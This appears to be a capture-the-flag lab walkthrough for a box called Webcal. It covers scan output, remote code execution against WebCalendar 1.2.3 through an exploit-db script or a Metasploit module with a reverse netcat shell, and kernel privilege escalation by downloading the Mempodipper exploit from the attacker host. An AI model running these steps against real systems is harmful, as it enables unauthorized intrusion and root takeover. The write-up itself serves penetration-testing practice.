# Webcal

### Enumeration

```
80/tcp open  http    Apache httpd 2.2.20 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.20 (Ubuntu)
|_http-title: Construction Page
```

```
- Nikto v2.1.6/2.1.5
+ Target Host: 192.168.175.37
+ Target Port: 80
...
+ OSVDB-3093: GET /webcalendar/login.php: This might be interesting...
```

WebCalendar v1.2.3 (14 Aug 2010)

### Initial Access

```
$ php /usr/share/exploitdb/exploits/php/webapps/18775.php 192.168.175.37 /webcalendar/
```

OR

```
msf6 exploit(linux/http/webcalendar_settings_exec) > options

Module options (exploit/linux/http/webcalendar_settings_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,t
                                         ype:host:port][...]
   RHOSTS     192.168.175.37   yes       The target host(s), range CIDR identifier
                                         , or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connection
                                         s
   TARGETURI  /webcalendar/    yes       The URI path to webcalendar
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be speci
                                     fied)
   LPORT  80               yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WebCalendar 1.2.4 on Linux
```

### PrivEsc

```
www-data@ucal:/$ uname -a
Linux ucal 3.0.0-12-server #20-Ubuntu SMP Fri Oct 7 16:36:30 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
```

Linux Kernel 2.6.39 < 3.2.2 (x86/x64) - 'Mempodipper' Local Privilege Escalation (2) | exploits/linux/local/35161.c

```
$ wget https://www.exploit-db.com/raw/35161 -O 35161.c
```

```
www-data@ucal:/$ cd /tmp
www-data@ucal:/tmp$ wget http://192.168.49.175/35161.c
www-data@ucal:/tmp$ gcc 35161.c -o poc
www-data@ucal:/tmp$ ./poc
```
